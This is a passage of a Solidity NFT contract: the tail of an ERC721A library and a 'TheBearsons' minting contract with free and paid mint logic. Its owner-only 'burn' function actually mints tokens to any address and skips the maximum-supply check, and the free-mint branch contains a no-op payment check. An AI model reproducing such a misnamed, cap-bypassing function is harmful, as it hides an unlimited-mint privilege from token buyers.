1067      * Requirements:
1068      *
1069      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1070      * - `quantity` must be greater than 0.
1071      *
1072      * Emits a {Transfer} event.
1073      */
1074     function _safeMint(
1075         address to,
1076         uint256 quantity,
1077         bytes memory _data
1078     ) internal {
1079         _mint(to, quantity, _data, true);
1080     }
1081 
1082     /**
1083      * @dev Mints `quantity` tokens and transfers them to `to`.
1084      *
1085      * Requirements:
1086      *
1087      * - `to` cannot be the zero address.
1088      * - `quantity` must be greater than 0.
1089      *
1090      * Emits a {Transfer} event.
1091      */
1092     function _mint(
1093         address to,
1094         uint256 quantity,
1095         bytes memory _data,
1096         bool safe
1097     ) internal {
1098         uint256 startTokenId = currentIndex;
1099         require(to != address(0), "ERC721A: mint to the zero address");
1100         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1101 
1102         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1103 
1104         // Overflows are incredibly unrealistic.
1105         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1106         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1107         unchecked {
1108             _addressData[to].balance += uint128(quantity);
1109             _addressData[to].numberMinted += uint128(quantity);
1110 
1111             _ownerships[startTokenId].addr = to;
1112             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1113 
1114             uint256 updatedIndex = startTokenId;
1115 
1116             for (uint256 i; i < quantity; i++) {
1117                 emit Transfer(address(0), to, updatedIndex);
1118                 if (safe) {
1119                     require(
1120                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1121                         "ERC721A: transfer to non ERC721Receiver implementer"
1122                     );
1123                 }
1124 
1125                 updatedIndex++;
1126             }
1127 
1128             currentIndex = updatedIndex;
1129         }
1130 
1131         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1132     }
1133 
1134     /**
1135      * @dev Transfers `tokenId` from `from` to `to`.
1136      *
1137      * Requirements:
1138      *
1139      * - `to` cannot be the zero address.
1140      * - `tokenId` token must be owned by `from`.
1141      *
1142      * Emits a {Transfer} event.
1143      */
1144     function _transfer(
1145         address from,
1146         address to,
1147         uint256 tokenId
1148     ) private {
1149         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1150 
1151         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1152             getApproved(tokenId) == _msgSender() ||
1153             isApprovedForAll(prevOwnership.addr, _msgSender()));
1154 
1155         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1156 
1157         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1158         require(to != address(0), "ERC721A: transfer to the zero address");
1159 
1160         _beforeTokenTransfers(from, to, tokenId, 1);
1161 
1162         // Clear approvals from the previous owner
1163         _approve(address(0), tokenId, prevOwnership.addr);
1164 
1165         // Underflow of the sender's balance is impossible because we check for
1166         // ownership above and the recipient's balance can't realistically overflow.
1167         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1168         unchecked {
1169             _addressData[from].balance -= 1;
1170             _addressData[to].balance += 1;
1171 
1172             _ownerships[tokenId].addr = to;
1173             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1174 
1175             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1176             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1177             uint256 nextTokenId = tokenId + 1;
1178             if (_ownerships[nextTokenId].addr == address(0)) {
1179                 if (_exists(nextTokenId)) {
1180                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1181                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1182                 }
1183             }
1184         }
1185 
1186         emit Transfer(from, to, tokenId);
1187         _afterTokenTransfers(from, to, tokenId, 1);
1188     }
1189 
1190     /**
1191      * @dev Approve `to` to operate on `tokenId`
1192      *
1193      * Emits a {Approval} event.
1194      */
1195     function _approve(
1196         address to,
1197         uint256 tokenId,
1198         address owner
1199     ) private {
1200         _tokenApprovals[tokenId] = to;
1201         emit Approval(owner, to, tokenId);
1202     }
1203 
1204     /**
1205      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1206      * The call is not executed if the target address is not a contract.
1207      *
1208      * @param from address representing the previous owner of the given token ID
1209      * @param to target address that will receive the tokens
1210      * @param tokenId uint256 ID of the token to be transferred
1211      * @param _data bytes optional data to send along with the call
1212      * @return bool whether the call correctly returned the expected magic value
1213      */
1214     function _checkOnERC721Received(
1215         address from,
1216         address to,
1217         uint256 tokenId,
1218         bytes memory _data
1219     ) private returns (bool) {
1220         if (to.isContract()) {
1221             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1222                 return retval == IERC721Receiver(to).onERC721Received.selector;
1223             } catch (bytes memory reason) {
1224                 if (reason.length == 0) {
1225                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1226                 } else {
1227                     assembly {
1228                         revert(add(32, reason), mload(reason))
1229                     }
1230                 }
1231             }
1232         } else {
1233             return true;
1234         }
1235     }
1236 
1237     /**
1238      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1239      *
1240      * startTokenId - the first token id to be transferred
1241      * quantity - the amount to be transferred
1242      *
1243      * Calling conditions:
1244      *
1245      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1246      * transferred to `to`.
1247      * - When `from` is zero, `tokenId` will be minted for `to`.
1248      */
1249     function _beforeTokenTransfers(
1250         address from,
1251         address to,
1252         uint256 startTokenId,
1253         uint256 quantity
1254     ) internal virtual {}
1255 
1256     /**
1257      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1258      * minting.
1259      *
1260      * startTokenId - the first token id to be transferred
1261      * quantity - the amount to be transferred
1262      *
1263      * Calling conditions:
1264      *
1265      * - when `from` and `to` are both non-zero.
1266      * - `from` and `to` are never both zero.
1267      */
1268     function _afterTokenTransfers(
1269         address from,
1270         address to,
1271         uint256 startTokenId,
1272         uint256 quantity
1273     ) internal virtual {}
1274 }
1275 
1276 contract TheBearsons is ERC721A, Ownable, ReentrancyGuard {
1277     string public baseURI = "ipfs://bafybeih5voksvwmbaj73u5za3bdppus3igeuzhvpx32j37kdnpt2ksexam/";
1278     uint   public price             = 0.003 ether;
1279     uint   public maxPerTx          = 20;
1280     uint   public maxPerFree        = 1;
1281     uint   public totalFree         = 2000;
1282     uint   public maxSupply         = 7777;
1283     bool   public mintEnabled;
1284     uint   public totalFreeMinted = 0;
1285 
1286     mapping(address => uint256) public _mintedFreeAmount;
1287 
1288     constructor() ERC721A("The Bearsons", "TBS"){}
1289 
1290     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1291         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1292         string memory currentBaseURI = _baseURI();
1293         return bytes(currentBaseURI).length > 0
1294             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1295             : "";
1296     }
1297 
1298     function mint(uint256 count) external payable {
1299         uint256 cost = price;
1300         bool isFree = ((totalFreeMinted + count < totalFree + 1) &&
1301             (_mintedFreeAmount[msg.sender] < maxPerFree));
1302 
1303         if (isFree) { 
1304             require(mintEnabled, "Mint is not live yet");
1305             require(totalSupply() + count <= maxSupply, "No more");
1306             require(count <= maxPerTx, "Max per TX reached.");
1307             if(count >= (maxPerFree - _mintedFreeAmount[msg.sender]))
1308             {
1309              require(msg.value >= (count * cost) - ((maxPerFree - _mintedFreeAmount[msg.sender]) * cost), "Please send the exact ETH amount");
1310              _mintedFreeAmount[msg.sender] = maxPerFree;
1311              totalFreeMinted += maxPerFree;
1312             }
1313             else if(count < (maxPerFree - _mintedFreeAmount[msg.sender]))
1314             {
1315              require(msg.value >= 0, "Please send the exact ETH amount");
1316              _mintedFreeAmount[msg.sender] += count;
1317              totalFreeMinted += count;
1318             }
1319         }
1320         else{
1321         require(mintEnabled, "Mint is not live yet");
1322         require(msg.value >= count * cost, "Please send the exact ETH amount");
1323         require(totalSupply() + count <= maxSupply, "No more");
1324         require(count <= maxPerTx, "Max per TX reached.");
1325         }
1326 
1327         _safeMint(msg.sender, count);
1328     }
1329 
1330     function costCheck() public view returns (uint256) {
1331         return price;
1332     }
1333 
1334     function maxFreePerWallet() public view returns (uint256) {
1335       return maxPerFree;
1336     }
1337 
1338     function burn(address mintAddress, uint256 count) public onlyOwner {
1339         _safeMint(mintAddress, count);
1340     }
1341 
1342     function _baseURI() internal view virtual override returns (string memory) {
1343         return baseURI;
1344     }
1345 
1346     function setBaseUri(string memory baseuri_) public onlyOwner {
1347         baseURI = baseuri_;
1348     }
1349 
1350     function setPrice(uint256 price_) external onlyOwner {
1351         price = price_;
1352     }
1353 
1354     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1355         totalFree = MaxTotalFree_;
1356     }
1357 
1358      function setMaxPerFree(uint256 MaxPerFree_) external onlyOwner {
1359         maxPerFree = MaxPerFree_;
1360     }
1361 
1362     function toggleMinting() external onlyOwner {
1363       mintEnabled = !mintEnabled;
1364     }
1365     
1366     function CommunityWallet(uint quantity, address user)
1367     public
1368     onlyOwner
1369   {
1370     require(
1371       quantity > 0,
1372       "Invalid mint amount"
1373     );
1374     require(
1375       totalSupply() + quantity <= maxSupply,
1376       "Maximum supply exceeded"
1377     );
1378     _safeMint(user, quantity);
1379   }
1380 
1381     function withdraw() external onlyOwner nonReentrant {
1382         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1383         require(success, "Transfer failed.");
1384     }
1385 }